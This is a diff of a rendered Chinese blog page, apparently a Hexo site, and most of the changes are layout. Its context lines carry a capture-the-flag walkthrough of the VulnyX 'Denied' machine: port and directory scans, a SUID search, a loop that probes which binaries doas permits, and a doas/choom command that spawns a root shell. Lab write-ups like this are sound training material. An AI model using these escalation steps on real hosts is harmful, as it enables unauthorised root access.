@@ -274,6 +274,16 @@
           
           
           <li>
+            <a href="/about/">
+              
+              关于
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
             <a href="/tags/">
               
               标签
@@ -287,16 +297,6 @@
             <a href="/categories/">
               
               分类
-              
-            </a>
-          </li>
-          
-          
-          
-          <li>
-            <a href="/about/">
-              
-              关于
               
             </a>
           </li>
@@ -406,11 +406,11 @@
               
               <a class="tag" href="/tags/#Linux" title="Linux">Linux</a>
               
-              <a class="tag" href="/tags/#权限提升" title="权限提升">权限提升</a>
-              
               <a class="tag" href="/tags/#SSH" title="SSH">SSH</a>
               
               <a class="tag" href="/tags/#密码爆破" title="密码爆破">密码爆破</a>
+              
+              <a class="tag" href="/tags/#权限提升" title="权限提升">权限提升</a>
               
               <a class="tag" href="/tags/#Web渗透" title="Web渗透">Web渗透</a>
               
@@ -493,11 +493,11 @@
       <!-- Post Container -->
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
-        <h1>Denied</h1>
-<p>靶机ip:192.168.108.137</p>
+        <h1 id="Denied"><a href="#Denied" class="headerlink" title="Denied"></a>Denied</h1><p>靶机ip:192.168.108.137</p>
 <p>攻击机ip:192.168.108.50</p>
 <p>靶机地址：<a target="_blank" rel="noopener" href="https://vulnyx.com/">https://vulnyx.com/</a></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">Kal ddddx ~ ❯ <span class="built_in">export</span> ip=192.168.108.137                                                                     at 14:10:09</span><br><span class="line">Kal ddddx ~ ❯ rustscan -a <span class="variable">$ip</span>                                                                               at 14:10:17</span><br><span class="line">.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.</span><br><span class="line">| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |</span><br><span class="line">| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |</span><br><span class="line">`-<span class="string">&#x27; `-&#x27;</span>`-----<span class="string">&#x27;`----&#x27;</span>  `-<span class="string">&#x27;  `----&#x27;</span>  `---<span class="string">&#x27; `-&#x27;</span>  `-<span class="string">&#x27;`-&#x27;</span> `-<span class="string">&#x27;</span></span><br><span class="line"><span class="string">The Modern Day Port Scanner.</span></span><br><span class="line"><span class="string">________________________________________</span></span><br><span class="line"><span class="string">: http://discord.skerritt.blog         :</span></span><br><span class="line"><span class="string">: https://github.com/RustScan/RustScan :</span></span><br><span class="line"><span class="string"> --------------------------------------</span></span><br><span class="line"><span class="string">RustScan: Making sure &#x27;</span>closed<span class="string">&#x27; isn&#x27;</span>t just a state of mind.</span><br><span class="line"></span><br><span class="line">[~] The config file is expected to be at <span class="string">&quot;/home/ddddx/.rustscan.toml&quot;</span></span><br><span class="line">[!] File <span class="built_in">limit</span> is lower than default batch size. Consider upping with --<span class="built_in">ulimit</span>. May cause harm to sensitive servers</span><br><span class="line">[!] Your file <span class="built_in">limit</span> is very small, <span class="built_in">which</span> negatively impacts RustScan<span class="string">&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;</span>--<span class="built_in">ulimit</span> 5000<span class="string">&#x27;.</span></span><br><span class="line"><span class="string">Open 192.168.108.137:22</span></span><br><span class="line"><span class="string">Open 192.168.108.137:80</span></span><br><span class="line"><span class="string">Open 192.168.108.137:8080</span></span><br><span class="line"><span class="string">[~] Starting Script(s)</span></span><br><span class="line"><span class="string">[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-09 14:10 CST</span></span><br><span class="line"><span class="string">Initiating ARP Ping Scan at 14:10</span></span><br><span class="line"><span class="string">Scanning 192.168.108.137 [1 port]</span></span><br><span class="line"><span class="string">Completed ARP Ping Scan at 14:10, 0.05s elapsed (1 total hosts)</span></span><br><span class="line"><span class="string">Initiating Parallel DNS resolution of 1 host. at 14:10</span></span><br><span class="line"><span class="string">Completed Parallel DNS resolution of 1 host. at 14:10, 0.01s elapsed</span></span><br><span class="line"><span class="string">DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span></span><br><span class="line"><span class="string">Initiating SYN Stealth Scan at 14:10</span></span><br><span class="line"><span class="string">Scanning 192.168.108.137 [3 ports]</span></span><br><span class="line"><span class="string">Discovered open port 80/tcp on 192.168.108.137</span></span><br><span class="line"><span class="string">Discovered open port 8080/tcp on 192.168.108.137</span></span><br><span class="line"><span class="string">Discovered open port 22/tcp on 192.168.108.137</span></span><br><span class="line"><span class="string">Completed SYN Stealth Scan at 14:10, 0.04s elapsed (3 total ports)</span></span><br><span class="line"><span class="string">Nmap scan report for 192.168.108.137</span></span><br><span class="line"><span class="string">Host is up, received arp-response (0.00089s latency).</span></span><br><span class="line"><span class="string">Scanned at 2025-06-09 14:10:25 CST for 0s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PORT     STATE SERVICE    REASON</span></span><br><span class="line"><span class="string">22/tcp   open  ssh        syn-ack ttl 64</span></span><br><span class="line"><span class="string">80/tcp   open  http       syn-ack ttl 64</span></span><br><span class="line"><span class="string">8080/tcp open  http-proxy syn-ack ttl 64</span></span><br><span class="line"><span class="string">MAC Address: 08:00:27:87:FB:37 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Read data files from: /usr/share/nmap</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds</span></span><br><span class="line"><span class="string">           Raw packets sent: 4 (160B) | Rcvd: 4 (160B)</span></span><br></pre></td></tr></table></figure>
+<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -528,6 +528,7 @@
 </tr>
 </tbody>
 </table>
+</div>
 <p>开放了22，80和8080端口，尝试访问一下,80和8080都为apache的默认页面，尝试一下目录爆破,发现也是一样的所以它们可能是同一个 Web 服务的不同监听端口</p>
 <p><img src="%E5%9B%BE%E7%89%87.png" alt="图片.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">Kal ddddx ~ ❯ gobuster <span class="built_in">dir</span> -u http://192.168.108.137 -w /usr/share/wordlists/dirb/common.txt -t 50  took 6s at 14:10:25</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.108.137</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 50</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.htaccess            (Status: 403) [Size: 280]</span><br><span class="line">/.hta                 (Status: 403) [Size: 280]</span><br><span class="line">/.htpasswd            (Status: 403) [Size: 280]</span><br><span class="line">/index.html           (Status: 200) [Size: 10701]</span><br><span class="line">/server-status        (Status: 403) [Size: 280]</span><br><span class="line">Progress: 4614 / 4615 (99.98%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br><span class="line">Kal ddddx ~ ❯ gobuster <span class="built_in">dir</span> -u http://192.168.108.137:8080 -w /usr/share/wordlists/dirb/common.txt -t 50     at 14:14:21</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.108.137:8080</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 50</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.hta                 (Status: 403) [Size: 282]</span><br><span class="line">/.htpasswd            (Status: 403) [Size: 282]</span><br><span class="line">/.htaccess            (Status: 403) [Size: 282]</span><br><span class="line">/index.html           (Status: 200) [Size: 10701]</span><br><span class="line">/server-status        (Status: 403) [Size: 282]</span><br><span class="line">Progress: 4614 / 4615 (99.98%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
@@ -546,6 +547,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">akira@denied:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">-bash: <span class="built_in">sudo</span>: orden no encontrada</span><br></pre></td></tr></table></figure>
 <p>sudo -l 发现没有安装<code>sudo</code> ，不过我们可以使用其他方法来查看有没有suid权限程序</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/doas</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysig</span><br></pre></td></tr></table></figure>
+<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -587,23 +589,21 @@
 </tr>
 </tbody>
 </table>
+</div>
 <p><img src="%E5%9B%BE%E7%89%87%203.png" alt="图片.png"></p>
 <p>接下来也是爆破直接按作者的来吧</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /usr/bin/ | awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span> &gt; bins.dic</span><br></pre></td></tr></table></figure>
-<h3 id="逐步解释：">逐步解释：</h3>
-<h3 id="ls-l-usr-bin"><code>ls -l /usr/bin/</code></h3>
-<ul>
+<h3 id="逐步解释："><a href="#逐步解释：" class="headerlink" title="逐步解释："></a>逐步解释：</h3><h3 id="ls-l-usr-bin"><a href="#ls-l-usr-bin" class="headerlink" title="ls -l /usr/bin/"></a><code>ls -l /usr/bin/</code></h3><ul>
 <li><code>ls</code>: 列出目录内容。</li>
 <li><code>l</code>: 使用 <strong>长格式</strong> 显示每个文件的详细信息（权限、所有者、大小、时间等）。</li>
 <li><code>/usr/bin/</code>: 要列出的目录，里面包含系统的大部分命令和可执行文件。</li>
 </ul>
-<h3 id="awk-print-9"><code>| awk '&#123;print $9&#125;'</code></h3>
-<ul>
+<h3 id="awk-39-print-9-39"><a href="#awk-39-print-9-39" class="headerlink" title="| awk &#39;{print $9}&#39;"></a><code>| awk &#39;&#123;print $9&#125;&#39;</code></h3><ul>
 <li><code>|</code>: 管道符，把 <code>ls -l</code> 的输出传给 <code>awk</code> 处理。</li>
-<li><code>awk '&#123;print $9&#125;'</code>: 提取每行的第 9 个字段（字段是以空格或制表符分隔的），这个字段通常是 <strong>文件名</strong>。</li>
+<li><code>awk &#39;&#123;print $9&#125;&#39;</code>: 提取每行的第 9 个字段（字段是以空格或制表符分隔的），这个字段通常是 <strong>文件名</strong>。</li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> -r bin; <span class="keyword">do</span> doas -n /usr/bin/<span class="string">&quot;<span class="variable">$bin</span>&quot;</span> --<span class="built_in">help</span> &gt;/dev/null 2&gt;&amp;1; ec=$?; <span class="keyword">if</span> [ <span class="variable">$ec</span> -eq 0 ]; <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;[+] <span class="variable">$bin</span> allowed&quot;</span>; <span class="keyword">elif</span> [ <span class="variable">$ec</span> -ne 1 ]; <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;[-] <span class="variable">$bin</span> denied (exit <span class="variable">$ec</span>)&quot;</span>; <span class="keyword">fi</span>; <span class="keyword">done</span> &lt; bins.dic</span><br></pre></td></tr></table></figure>
-<h3 id="表格讲解：">表格讲解：</h3>
+<h3 id="表格讲解："><a href="#表格讲解：" class="headerlink" title="表格讲解："></a>表格讲解：</h3><div class="table-container">
 <table>
 <thead>
 <tr>
@@ -660,10 +660,10 @@
 <td><code>done &lt; bins.dic</code></td>
 <td>循环结束，读取文件</td>
 <td>从 <code>bins.dic</code> 文件中读取命令名</td>
-<td></td>
 </tr>
 </tbody>
 </table>
+</div>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">doas /usr/bin/choom -n 0 /bin/sh</span><br></pre></td></tr></table></figure>
 <p><img src="%E5%9B%BE%E7%89%87%204.png" alt="图片.png"></p>
 
@@ -831,11 +831,11 @@
             
             <a class="tag" href="/tags/#Linux" title="Linux">Linux</a>
             
-            <a class="tag" href="/tags/#权限提升" title="权限提升">权限提升</a>
-            
             <a class="tag" href="/tags/#SSH" title="SSH">SSH</a>
             
             <a class="tag" href="/tags/#密码爆破" title="密码爆破">密码爆破</a>
+            
+            <a class="tag" href="/tags/#权限提升" title="权限提升">权限提升</a>
             
             <a class="tag" href="/tags/#Web渗透" title="Web渗透">Web渗透</a>
             
